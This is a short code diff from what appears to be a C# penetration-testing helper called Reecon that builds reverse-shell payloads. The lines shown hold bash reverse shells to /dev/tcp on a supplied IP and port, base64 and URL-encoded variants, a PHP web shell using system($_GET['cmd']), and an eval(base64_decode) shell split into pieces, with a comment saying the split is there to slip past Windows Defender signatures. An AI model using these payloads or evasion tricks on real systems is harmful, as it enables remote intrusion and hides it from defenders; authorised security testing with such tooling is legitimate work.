@@ -130,7 +130,6 @@ namespace Reecon
             string shell = $"bash -i >& /dev/tcp/{ip}/{port} 0>&1";
             string altShell = $"bash -i &>/dev/tcp/{ip}/{port} <&1";
             string saferShell = "bash -c \"" + shell + "\"";
-            string saferAltShell = "bash -c \"" + altShell + "\"";
             string saferBase64Shell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(saferShell));
             string saferBase64AltShell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(altShell));
             string saferURLEncodedShell = $"bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22";
@@ -198,9 +197,9 @@ namespace Reecon
             // Space is to bypass Windows Defender definitions
             // Still gets picked up by "bkav" though - Will deal with later if needed
             string evalShell = "eva" + "l(base64_decode('" + b64Shell + "'));";
-            return "Regular: <?php " + plainShell + " ?>" + Environment.NewLine
-                + "Safer: <?php " + evalShell + " ?>" + Environment.NewLine
-                + "No Upload: php -r \"" + evalShell + "\"" + Environment.NewLine
+            return $"Regular: <?php {plainShell} ?>" + Environment.NewLine
+                + $"Safer: <?php {evalShell} ?>" + Environment.NewLine
+                + $"No Upload: php -r \"{evalShell}\"" + Environment.NewLine
                 + "Simple Shell: <?php system($_GET[\"cmd\"]); ?>";
         }
 
